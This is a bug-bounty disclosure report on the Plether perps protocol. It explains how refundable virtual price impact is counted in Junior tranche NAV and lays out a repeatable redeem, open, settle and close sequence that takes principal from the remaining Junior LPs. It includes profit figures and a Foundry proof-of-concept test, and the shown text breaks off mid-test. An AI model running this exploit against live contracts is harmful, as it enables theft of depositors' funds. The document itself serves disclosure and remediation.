# \#98177 [SC-Critical] Junior tranche NAV counts refundable virtual price impact as pool revenue, enabling direct theft of principal from the Junior holders who remain

**Submitted on Nov 5th 2026 at 18:23:55 UTC by @Emmac for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98177
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Plether prices Junior LP deposits and redemptions from a net asset value that treats the virtual price impact (VPI) a trader pays on a skew-increasing open as final pool revenue. That VPI is not final. The position's lifetime rebate clamp entitles the same account to reclaim the full amount when it closes, and the pool pays it back out of cash. For the whole interval between the open and the close, Junior NAV is overstated by the outstanding VPI, and nothing in the pool's accounting records the matching refund obligation. An attacker who controls one ordinary LP address and one ordinary trading address requests a Junior redemption, opens a skew-increasing position so that the next LP-epoch settlement prices the redemption on the inflated NAV, then closes the position so the pool refunds the VPI. The redeeming account leaves with a pro rata share of cash the pool is obligated to return, and the Junior holders who stay in the pool fund that refund out of their deposited principal. The price never moves, no privileged role is involved, and the loss is realized USDG, not a paper mark.

## Vulnerability Details

### Background: VPI and the lifetime clamp

Virtual price impact is a skew-based charge or rebate assessed on trades, accounted separately from price PnL. A trade that increases the pool's absolute directional skew pays a positive VPI into the pool; a trade that reduces skew receives a negative VPI (a rebate) out of the pool. The charge is the difference of a state potential `C(S) = k * S^2 / (2 * D)`, where `k` is `vpiFactor`, `S` is absolute skew, and `D` is economic depth (`WHITEPAPER.md` section 5.1).

Each position carries a signed lifetime accrual `vpiAccrued`. A close evaluates a fresh VPI delta at the current pre-close and post-close skew, then applies a lifetime clamp so that the position can never reclaim more than it has paid:

```solidity
// packages/perps/src/libraries/CloseAccountingLib.sol:103-118
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
// With no economic depth, keep protective exits live without creating a fresh charge or rebate.
// The lifetime clamp below still recovers any previously received negative VPI.
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. This rule is identical in live and oracle-frozen markets; frozen-market
// stale-price risk is priced separately through frozenSpreadAssets.
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The clamp binds only when the position would end with negative lifetime VPI. A position that pays `c` on open and reverses the identical skew change at the same depth on close has `proportionalAccrualAssets = +c` and `vpiDeltaAssets = -c`. Their sum is zero, so the clamp does not bind and the full `c` is refunded. The whitepaper states this outright: "The VPI charge is $20,000. Reversing the move at unchanged depth produces a $20,000 rebate before the lifetime clamp" (`WHITEPAPER.md:903-904`). The clamp exists to stop a trader from profiting on the VPI round trip, and it does: the trader leg nets to zero on VPI and loses only its fees. That protection is confirmed by the project's own test `test_VpiClampPreventsNetRebateExtraction` in `test/perps/accounting/close/VpiRoundTripAccounting.t.sol`, which asserts the round-tripping trader ends exactly `deposit - 2 * executionFee`.

### The open pays real cash into the pool and the waterfall books it to Junior

When a skew-increasing open executes, the positive VPI is collected as settlement cash and recorded as pool revenue:

```solidity
// packages/perps/src/CfdEngineSettlementSidecar.sol:454-460
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
```

At the next reconcile, the Senior tranche is a fixed-rate coupon claimant, so all revenue above the Senior coupon flows to Junior principal through the waterfall (`HousePoolWaterfallAccountingLib.distributeRevenue`, `HousePoolWaterfallAccountingLib.sol:140-159`). Junior NAV rises by the full `c`.

### LP pricing omits the refund obligation

Both deposits and redemptions are priced from one signed terminal equity figure:

```text
signedTerminalEquity = physicalAssets - totalTraderClaimBalanceAssets + terminalLpPriceDeltaAssets
distributable        = max(signedTerminalEquity, 0)
```

This is `ACCOUNTING_SPEC.md:158-174`, computed in `HousePoolAccountingLib` and consumed by every Junior deposit and redemption. The pricing input `terminalLpPriceDeltaAssets` carries the collectible price-PnL adjustment only:

```solidity
// packages/perps/src/CfdEngineProtocolLens.sol:70
snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets;
```

The protocol deliberately keeps anticipated VPI out of the terminal curve: "neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV" (`SECURITY.md:872`). That rule is written for negative accrued VPI, which is held as a dedicated non-withdrawable reserve. It is not applied to positive accrued VPI. Positive VPI has already been paid in as physical cash, so it enters `physicalAssets` in full, it is not a trader claim, and `terminalLpPriceDeltaAssets` does not subtract it. The pool therefore prices Junior shares against cash it is contractually going to hand back, and books no offsetting liability for the refund. The treatment is asymmetric: negative accrued VPI is excluded from NAV, positive accrued VPI is included.

### The close pays the cash back out, after the redeeming LP has left

On close, the clamped rebate is paid from free pool cash to the trader:

```solidity
// packages/perps/src/CfdEngineSettlementSidecar.sol:621-623
if (delta.actionRebatePaidAssets > 0) {
    IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
    clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
}
```

Pool cash drops by `c`, Junior NAV falls by `c`, and that decline lands entirely on whoever still holds Junior shares. If the attacker's LP leg redeemed while the VPI was outstanding, the attacker is gone, and the honest holders absorb the full decline.

### Why the timing is reachable by an untrusted actor

The redemption price is fixed at settlement time, not at request time. Global invariant 15 states "LP request ids use the same five-minute cutoff for both tranches and both directions; maturity does not fix a price" (`ACCOUNTING_SPEC.md:1298`). The attacker requests the redemption on a flat book, opens the skew-increasing position shortly before the epoch boundary, and any keeper's `settleLpEpoch` prices the matured redemption on the inflated NAV because the position is open and its VPI is in the pool. The attacker then closes. Execution and settlement are permissionless, and the program states keepers are not trusted. In the proof of concept, an independent keeper address performs every `executeOrder`, `updateMarkPrice`, and `settleLpEpoch` call, so the attacker does not control settlement timing beyond ordinary order submission.

### The broken invariant, stated precisely

`ACCOUNTING_SPEC.md:172` describes the pricing as symmetric: "an entrant receives the same discount for inherited marked liabilities that an exiting LP bears". Global invariant 7 (`ACCOUNTING_SPEC.md:1288`, "LP entry and exit use the same terminal-NAV accounting") is not literally broken, because entry and exit do use the one formula. The defect is that the formula omits refundable VPI, which is an unmarked liability the symmetry clause does not reach, so entrant and exiting LP are made equal on a NAV that is itself wrong while the liability is outstanding. The documents disclose the equivalent timing trade-off for carry and limit it to carry (`ACCOUNTING_SPEC.md:737`, "This intentionally allows a trader and incoming LP to time collection after LP activation and share carry accrued before that activation"). Carry is real, non-refundable revenue, so timing around it only redistributes earned income and leaves the pool whole. VPI is refundable, so timing around it removes principal from the holders who stay and leaves the pool short by the fees. No document discloses that an LP can take other LPs' funds through VPI.

### End-to-end attack path

1. The attacker holds a share `f` of the Junior tranche through an ordinary LP address and funds an ordinary trading address through `clearinghouse.depositMargin`.
2. `juniorVault.requestRedeem` for the full LP stake, on a flat book. The request matures at epoch `e`.
3. About ninety seconds before `lpEpochStart(e)`, `router.commitOrder` for a skew-increasing open of notional `N` under the 0.4 skew cap, executed by an independent keeper through `router.executeOrder`. VPI `c` enters the pool.
4. After the epoch opens, the independent keeper runs `router.settleLpEpoch`. The matured redemption is funded at the inflated NAV, which includes `c`.
5. `router.commitOrder` for a full close, executed by the keeper. The clamp refunds `c` from pool cash. Junior NAV drops onto the holders who stayed.
6. `juniorVault.claimRedeem`, then `juniorVault.requestDeposit` at the now-fair NAV, wait out the one-hour cooldown, and repeat.

Per round, with depth `D`, existing same-direction skew `S0`, and `k = 0.01`, the attacker's LP leg captures `f * k * (2 * S0 * N + N^2) / (2 * D)` and the trading leg costs two execution fees of 4 bps each on `N` plus the adverse-confidence shift on both fills. The attack is profitable once the captured VPI exceeds those fixed fees.

## Impact Details

In-scope impact: **Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.** Severity: **Critical.**

The funds stolen are deposited USDG that honest Junior LPs hold as principal, not unclaimed yield. The price is flat in every measurement, the only "revenue" in the pool is the attacker's own VPI, and that VPI is refunded to the attacker. The honest holder actually redeems and receives fewer USDG than it would have with no attack, so the loss is realized, not a mark. The attacker ends above its starting capital, so the griefing downgrade does not apply.

All figures are measured by the proof of concept at release parameters, with depth 10,000,000 USDG split 5,000,000 Junior and 5,000,000 Senior, price flat at 1.08000013, confidence 0.46 bps on every fill, Senior coupon and carry active. Each row compares two runs from one snapshot that are identical except for the attacker's position, and the amounts close to within 0.012 USDG across attacker, honest holder, Senior, treasury, and keeper, which proves conservation.

| Attacker share of Junior | Book | Rounds | Honest holder vs no attack | Attacker vs no attack | Attacker vs starting capital |
| --- | --- | --- | --- | --- | --- |
| 25% | flat | 1 | -255.38 | -1,299.99 | -1,357.13 |
| 50% | flat | 1 | -2,156.11 | +600.73 | +486.50 |
| 50% | flat | 8 (24 h) | -17,357.81 (-69 bps) | +4,914.76 | +4,480.84 |
| 60% | flat | 8 (24 h) | -23,461.94 (-117 bps) | +11,018.90 | +10,498.19 |
| 30% | 0.19 D existing skew | 1 | not applicable | +106.52 | not applicable |

Entering during the mirror-direction rebate dip, with a 15,000,000 deposit against 5,000,000 of incumbents and 0.35 D of existing skew, the attacker nets +1,661.42 and the incumbent loses 4,426.44.

The loss recurs. The eight-round figures are about eight times the single-round figures, and the attack repeats every three hours. Amounts scale linearly with depth, and the release Senior cap alone admits 40,000,000 USDG of depth. In the headline 24-hour run, the honest holder loses 17,357.81 USDG of its 2,500,000 deposit; the attacker keeps 4,914.76 and the treasury collects 12,441.46 as execution fees paid by the attacker's trading leg. The honest holder funds both the attacker's profit and those fees out of its principal.

Feasibility, stated plainly:

- Stake. On a flat book the attack needs about 42% of the Junior tranche; the 25% row loses money. Existing skew lowers the threshold because each unit of notional then pumps more, and 30% is measured profitable once ordinary skew exists. The program states that a high capital requirement is generally not a valid reason to downgrade a report, and that impact is calculated first, separately from feasibility.
- Price exposure. The position is open for about two minutes per round. This is zero-mean noise of a few hundred USDG at this size, it is hedgeable off platform, and the exiting LP leg offsets part of it until the redemption funds. The proof of concept holds the price flat to isolate the accounting.
- Covenant. Junior redemptions must leave the Senior-share covenant satisfied, which caps `f`. Every row above respects it, and the headline rows value any queued slice at NAV.

## References

- `packages/perps/src/CfdEngineSettlementSidecar.sol:454-460` (positive VPI recorded as pool revenue on open) and `:621-623` (clamped rebate paid from pool cash on close).
- `packages/perps/src/libraries/CloseAccountingLib.sol:103-118` (lifetime clamp; full refund on a symmetric round trip).
- `packages/perps/src/CfdEngineProtocolLens.sol:70` (LP pricing input carries only `terminalLpPriceDeltaAssets`; refundable VPI absent).
- `packages/perps/src/libraries/HousePoolAccountingLib.sol:60-78` (`distributable = physicalAssets - claims + terminalLpPriceDeltaAssets`).
- `packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:140-159` (revenue above the Senior coupon flows to Junior).
- `packages/perps/src/HousePool.sol:839-842`, `:944` (Junior deposit and redemption pricing from that principal).
- `packages/perps/ACCOUNTING_SPEC.md:158-174` (symmetric exact marked NAV), `:737-740` (carry timing policy, carry only), `:1288` (global invariant 7), `:1298` (global invariant 15, maturity does not fix a price).
- `packages/perps/SECURITY.md:863` (VPI stays outside the pre-close price book), `:872` (anticipated VPI and its reserve do not inflate terminal K or symmetric NAV), `:1443` (clamp zeroes extractable rebate-only round trips, trader leg only).
- `packages/perps/WHITEPAPER.md:411-412` (positive VPI increases physical pool assets), `:903-904` (a reversal refunds the full charge before the clamp).
- `packages/perps/DEPLOYMENT.md` (release parameters asserted by the proof of concept).
- `packages/perps/test/perps/accounting/close/VpiRoundTripAccounting.t.sol` (`test_VpiClampPreventsNetRebateExtraction`, the project's own proof that the clamp protects the trader leg only).


## Proof of Concept

## Proof of Concept

Place the file at `packages/perps/test/perps/poc/JuniorNavRefundableVpiPoC.t.sol` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, with no other change, and run:

```sh
FOUNDRY_TEST=test/perps/poc forge test --root packages/perps \
  --match-path 'test/perps/poc/JuniorNavRefundableVpiPoC.t.sol' -vv
```

`FOUNDRY_TEST=test/perps/poc` limits compilation to this directory. The test extends `BasePerpTest`, uses only the production V3 order path, mocks only Pyth and USDG, applies the `DEPLOYMENT.md` release parameters (asserted by `test_ReleaseParameters`), and holds the price flat at 1.08000013. Owner actions occur only in `setUp` to install release configuration. The attacker's LP and trading addresses and the independent keeper are plain addresses using public entrypoints. Each economic test runs the same rounds twice from one snapshot, once with the attack and once without, and asserts both the attacker profit and the honest-holder loss, with a conservation check that every USDG is accounted for.

The correct fix makes this test fail. Tracking the signed sum of `vpiAccrued` across open positions in the Engine and subtracting it from the delta that feeds `distributable` keeps refundable VPI out of LP pricing until it is final. With that change applied, every profit-claiming test turns red; the attacker loses its fees in every scenario, for example a net of -25,425.78 USDG over the 24-hour run, and the honest holder finishes +12,982.71 instead of -17,357.81.

### Test source

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

import {BasePerpTest} from "../BasePerpTest.sol";

/// @title PoC: Junior LP pricing counts refundable VPI, so a Junior holder extracts the funds of the holders who stay
/// @notice A skew-increasing open pays VPI into HousePool, and the waterfall books all of it to Junior at the next reconcile.
///         The same position receives it back as a rebate when it closes. A Junior holder whose redemption is funded between
///         the two receives a pro-rata share of money that is about to be refunded, and the holders who stay pay the refund.
///         The mirror case is a skew-reducing open, whose rebate depresses Junior NAV until the close claws it back.
///
///         Every path compares two runs from one snapshot, identical except for the attacker's position. The price is flat
///         at 1.08000013 throughout, so no result comes from a market move. Mocks: Pyth and USDG only. Owner actions: setup only.
///         Attackers and the keeper are plain addresses using public entrypoints.
contract JuniorNavRefundableVpiPoC is BasePerpTest {

    uint256 internal constant PX = 108_000_013;
    /// @dev 0.46 bps of price: nonzero, so fills pay the real adverse-confidence shift, and inside the 10 bps basket cap.
    uint64 internal constant CONFIDENCE = 5000;
    uint256 internal constant LOT = 1e20;
    uint256 internal constant LOT_NOTIONAL = 108e6;

    uint256 internal constant JUNIOR_ASSETS = 5_000_000e6;
    uint256 internal constant SENIOR_ASSETS = 5_000_000e6;
    /// @dev 3.888M notional: 0.39 of the 10M depth, under the 0.4 skew cap.
    uint256 internal constant PUMP_LOTS = 36_000;
    uint256 internal constant TRADER_CAPITAL = 1_000_000e6;

    address internal attackerLp = makeAddr("attackerLp");
    address internal attackerTrader = makeAddr("attackerTrader");
    address internal honestJunior = makeAddr("honestJunior");
    address internal honestSenior = makeAddr("honestSenior");
    address internal retailTrader = makeAddr("retailTrader");
    address internal keeper = makeAddr("independentKeeper");

    uint256 internal clientNonce;
    uint256 internal attackerCapital;
    uint256 internal honestDeposit;

    struct Result {
        uint256 attackerWealth;
        uint256 honestCash;
        uint256 seniorValue;
        uint256 treasury;
        uint256 keeperCredit;
    }

    // ------------------------------------------------------------------ release configuration (DEPLOYMENT.md)

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.minOpenNotionalAssets = 1000e6;
        routerConfig.adverseConfidenceMultiplierBps = 2500;
        routerAdmin.proposeRouterConfig(routerConfig);
        vm.warp(block.timestamp + 72 hours + 1);
        pool.finalizePoolConfig();
        routerAdmin.finalizeRouterConfig();
    }

    function test_ReleaseParameters() public view {
        (uint256 vpiFactor, uint256 maxSkew, uint256 maint, uint256 init, uint256 fad, uint256 carry,,,,) = engine.riskParams();
        assertEq(vpiFactor, 0.01e18, "vpiFactor");
        assertEq(maxSkew, 0.4e18, "maxSkewRatio");
        assertEq(maint, 10, "maintMarginBps");
        assertEq(init, 20, "initMarginBps");
        assertEq(fad, 300, "fadMarginBps");
        assertEq(carry, 500, "baseCarryBps");
        assertEq(engine.executionFeeBps(), 4, "executionFeeBps");
        assertEq(engine.settlementBufferBps(), 25, "settlementBufferBps");
        assertEq(pool.seniorRateBps(), 800, "seniorRateBps");
        assertEq(pool.maxSeniorShareBps(), 8000, "maxSeniorShareBps");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "minOpenNotionalAssets");
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500, "adverseConfidenceMultiplierBps");
    }

    // ------------------------------------------------------------------ helpers

    function _warpToMondayNoon() internal {
        uint256 ts = vm.getBlockTimestamp();
        uint256 day = ts / 1 days;
        uint256 dow = (day + 4) % 7;
        uint256 daysAhead = dow == 1 ? 7 : (8 - dow) % 7;
        vm.warp((day + daysAhead) * 1 days + 12 hours);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _tick(
        uint256 secondsAhead
    ) internal {
        vm.warp(vm.getBlockTimestamp() + secondsAhead);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _priceData() internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = abi.encode(PX);
    }

    function _refreshMark() internal {
        _tick(1);
        vm.prank(keeper);
        router.updateMarkPrice(_priceData());
    }

    function _lpDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        vm.warp(pool.lpEpochStart(requestId));
        vm.prank(keeper);
        pool.settleLpEpoch(0, 0);
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        vault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _fund(
        address trader,
        uint256 amount
    ) internal {
        settlementToken.mint(trader, amount);
        vm.startPrank(trader);
        settlementToken.approve(address(clearinghouse), amount);
        clearinghouse.depositMargin(amount);
        vm.stopPrank();
    }

    function _commit(
        address trader,
        CfdTypes.Side side,
        uint256 lots,
        uint256 margin,
        bool isClose
    ) internal returns (uint64 orderId) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("poc", trader, ++clientNonce)),
            side: side,
            sizeDelta: lots * LOT,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        orderId = router.commitOrder(request);
    }

    /// @dev The first post-commit tick carries nonzero confidence, so each fill pays the release adverse shift.
    function _execute(
        uint64 orderId
    ) internal {
        _tick(1);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(uint64(PX)), CONFIDENCE, int32(-8), publishTime, publishTime - 1
        );
        vm.prank(keeper);
        router.executeOrder(orderId, _priceData());
    }

    function _open(
        address trader,
        CfdTypes.Side side,
        uint256 lots
    ) internal {
        _execute(_commit(trader, side, lots, lots * LOT_NOTIONAL / 20, false));
    }

    function _close(
        address trader,
        CfdTypes.Side side,
        uint256 lots
    ) internal {
        _refreshMark();
        _execute(_commit(trader, side, lots, 0, true));
        (uint256 size,,,,,,) = engine.positions(trader);
        assertEq(size, 0, "position closed");
    }

    /// @dev Settlement is run by an independent keeper; the attacker neither calls it nor chooses when it happens.
    function _keeperSettles() internal {
        _tick(1);
        vm.prank(keeper);
        if (engine.terminalNavSnapshot().hasOpenPositions) {
            router.settleLpEpoch(_priceData());
        } else {
            pool.settleLpEpoch(0, 0);
        }
    }

    function _setUpPool(
        uint256 attackerShareBps
    ) internal {
        _warpToMondayNoon();
        _refreshMark();
        uint256 attackerStake = JUNIOR_ASSETS * attackerShareBps / 10_000;
        honestDeposit = JUNIOR_ASSETS - attackerStake;
        _lpDeposit(juniorVault, honestJunior, honestDeposit);
        if (attackerStake != 0) {
            _lpDeposit(juniorVault, attackerLp, attackerStake);
        }
        _lpDeposit(seniorVault, honestSenior, SENIOR_ASSETS);
        _fund(attackerTrader, TRADER_CAPITAL);
        attackerCapital = attackerStake + TRADER_CAPITAL;
        _tick(2 hours);
    }

    function _delta(
        uint256 a,
        uint256 b
    ) internal pure returns (int256) {
        return int256(a) - int256(b);
    }

    // ------------------------------------------------------------------ the attack

    /// @dev One round. The redemption is requested first, with the book flat. The position is open before the epoch starts,
    ///      so the first settlement by anyone prices it, and it closes afterwards. The attacker then re-enters at the now-fair
    ///      NAV and waits out the cooldown.
    function _round(
        bool attack,
        uint256 lots
    ) internal {
        _refreshMark();
        uint256 shares = juniorVault.balanceOf(attackerLp);
        vm.prank(attackerLp);
        uint256 redeemId = juniorVault.requestRedeem(shares, attackerLp, attackerLp);

        vm.warp(pool.lpEpochStart(redeemId) - 90);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark();
        if (attack) {
            _open(attackerTrader, CfdTypes.Side.LONG, lots);
        }
        vm.warp(pool.lpEpochStart(redeemId) + 7);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark();
        _keeperSettles();
        if (attack) {
            _close(attackerTrader, CfdTypes.Side.LONG, lots);
        }

        uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, attackerLp);
        vm.prank(attackerLp);
        juniorVault.claimRedeem(redeemId, claimable, attackerLp, attackerLp);

        uint256 cash = settlementToken.balanceOf(attackerLp);
        _refreshMark();
        vm.startPrank(attackerLp);
        settlementToken.approve(address(juniorVault), cash);
        uint256 depositId = juniorVault.requestDeposit(cash, attackerLp, attackerLp);
        vm.stopPrank();
        vm.warp(pool.lpEpochStart(depositId) + 7);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark();
        _keeperSettles();
        uint256 owed = juniorVault.claimableDepositRequest(depositId, attackerLp);
        vm.prank(attackerLp);
        juniorVault.claimDeposit(depositId, owed, attackerLp, attackerLp);
        _tick(1 hours + 1);
    }

    /// @dev The honest holder really leaves, so its loss is USDG received rather than a computed NAV.
    function _honestCashesOut() internal returns (uint256 cash) {
        _refreshMark();
        uint256 shares = juniorVault.balanceOf(honestJunior);
        vm.prank(honestJunior);
        uint256 id = juniorVault.requestRedeem(shares, honestJunior, honestJunior);
        vm.warp(pool.lpEpochStart(id) + 7);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark();
        _keeperSettles();
        uint256 claimable = juniorVault.claimableRedeemRequest(id, honestJunior);
        vm.prank(honestJunior);
        juniorVault.claimRedeem(id, claimable, honestJunior, honestJunior);
        cash = settlementToken.balanceOf(honestJunior);
        // Only a holder of most of Junior can meet the Senior covenant here; its queued slice is valued at NAV.
        if (claimable < shares) {
            _refreshMark();
            (, uint256 juniorAssets,,) = pool.getPendingTrancheState();
            cash += (shares - claimable) * juniorAssets / juniorVault.totalSupply();
        }
    }

    function _readResult() internal returns (Result memory r) {
        r.honestCash = _honestCashesOut();
        _refreshMark();
        (uint256 seniorAssets, uint256 juniorAssets,,) = pool.getPendingTrancheState();
        r.attackerWealth = juniorVault.balanceOf(attackerLp) * juniorAssets / juniorVault.totalSupply()
            + clearinghouse.balanceAssets(attackerTrader);
        r.seniorValue = seniorAssets;
        r.treasury = clearinghouse.balanceAssets(engine.protocolTreasury());
        r.keeperCredit = clearinghouse.balanceAssets(keeper);
    }

    function extRounds(
        uint256 rounds,
        uint256 lots,
        bool attack
    ) external returns (Result memory r) {
        for (uint256 i; i < rounds; ++i) {
            _round(attack, lots);
        }
        r = _readResult();
    }

    function _compare(
        uint256 rounds,
        uint256 lots
    ) internal returns (int256 attackerVsBaseline, int256 honestVsBaseline, int256 attackerAbsolute) {
        // Invariant before the attack: every Junior share is priced the same, whoever holds it.
        _refreshMark();
        (, uint256 juniorAssets,,) = pool.getPendingTrancheState();
        uint256 supply = juniorVault.totalSupply();
        uint256 honestShares = juniorVault.balanceOf(honestJunior);
        assertApproxEqAbs(honestShares * juniorAssets / supply, honestDeposit, 3000e6, "honest holder starts at its deposit");
        assertEq(engine.terminalNavSnapshot().hasOpenPositions, false, "the book starts flat");

        uint256 snapshot = vm.snapshotState();
        Result memory base = this.extRounds(rounds, lots, false);
        vm.revertToState(snapshot);
        uint256 startTime = vm.getBlockTimestamp();
        Result memory hit = this.extRounds(rounds, lots, true);
        uint256 elapsedMinutes = (vm.getBlockTimestamp() - startTime) / 1 minutes;

        attackerVsBaseline = _delta(hit.attackerWealth, base.attackerWealth);
        honestVsBaseline = _delta(hit.honestCash, base.honestCash);
        attackerAbsolute = _delta(hit.attackerWealth, attackerCapital);
        int256 senior = _delta(hit.seniorValue, base.seniorValue);
        int256 treasury = _delta(hit.treasury, base.treasury);
        int256 keeperGain = _delta(hit.keeperCredit, base.keeperCredit);
        int256 residual = attackerVsBaseline + honestVsBaseline + senior + treasury + keeperGain;

        emit log_named_uint("rounds", rounds);
        emit log_named_uint("elapsed minutes, including the final cash-out", elapsedMinutes);
        emit log_named_decimal_uint("honest holder deposited", honestDeposit, 6);
        emit log_named_decimal_uint("honest holder cash out, no attack", base.honestCash, 6);
        emit log_named_decimal_uint("honest holder cash out, attacked", hit.honestCash, 6);
        emit log_named_decimal_int("honest holder change vs no attack", honestVsBaseline, 6);
        emit log_named_int("honest holder change, bps of its stake", honestVsBaseline * 10_000 / int256(base.honestCash));
        emit log_named_decimal_uint("attacker starting capital", attackerCapital, 6);
        emit log_named_decimal_uint("attacker final wealth, no attack", base.attackerWealth, 6);
        emit log_named_decimal_uint("attacker final wealth, attacked", hit.attackerWealth, 6);
        emit log_named_decimal_int("attacker net vs no attack", attackerVsBaseline, 6);
        emit log_named_decimal_int("attacker absolute profit on capital", attackerAbsolute, 6);
        emit log_named_decimal_int("treasury change (execution fees)", treasury, 6);
        emit log_named_decimal_int("Senior change", senior, 6);
        emit log_named_decimal_int("keeper change", keeperGain, 6);
        emit log_named_decimal_int("closed sum, about zero", residual, 6);
        assertLt(residual < 0 ? -residual : residual, int256(10e6), "every USDG is accounted for");
    }

    /// @notice One round at a flat price, with half of Junior held by the attacker.
    function test_OneRound_FlatBook_HalfOfJunior() public {
        _setUpPool(5000);
        (int256 attackerNet, int256 honestNet,) = _compare(1, PUMP_LOTS);
        assertGt(attackerNet, 0, "the attacker profits at a flat price");
        assertLt(honestNet, 0, "the honest holder cashes out less");
    }

    /// @notice Eight rounds in 24 hours. Profit recurs and the honest holder's loss accumulates.
    function test_OneDay_FlatBook_HalfOfJunior() public {
        _setUpPool(5000);
        (int256 attackerNet, int256 honestNet, int256 absolute) = _compare(8, PUMP_LOTS);
        assertGt(attackerNet, 0, "repetition stays profitable");
        assertGt(absolute, 0, "the attacker ends above its starting capital, after paying its share of the Senior coupon");
        assertLt(honestNet, -int256(15_000e6), "the honest holder loses over 15,000 USDG in one day");
    }

    /// @notice A larger stake captures more of each round's VPI against the same fixed fees.
    function test_OneDay_FlatBook_SixtyPercentOfJunior() public {
        _setUpPool(6000);
        (int256 attackerNet, int256 honestNet, int256 absolute) = _compare(8, PUMP_LOTS);
        assertGt(attackerNet, 0, "repetition stays profitable");
        assertGt(absolute, 0, "the attacker ends above its starting capital");
        assertLt(honestNet, 0, "the honest holder cashes out less");
    }

    /// @notice The limit of the flat-book attack: below about 42% of Junior the fees exceed the captured VPI.
    function test_OneRound_FlatBook_QuarterOfJunior_IsNotProfitable() public {
        _setUpPool(2500);
        (int256 attackerNet,,) = _compare(1, PUMP_LOTS);
        assertLt(attackerNet, 0, "a 25% holder loses money on a flat book");
    }

    /// @notice Existing same-direction skew makes each unit of notional pump more, so a smaller stake is enough.
    function test_OneRound_NaturalSkew_ThirtyPercentOfJunior() public {
        _setUpPool(3000);
        _refreshMark();
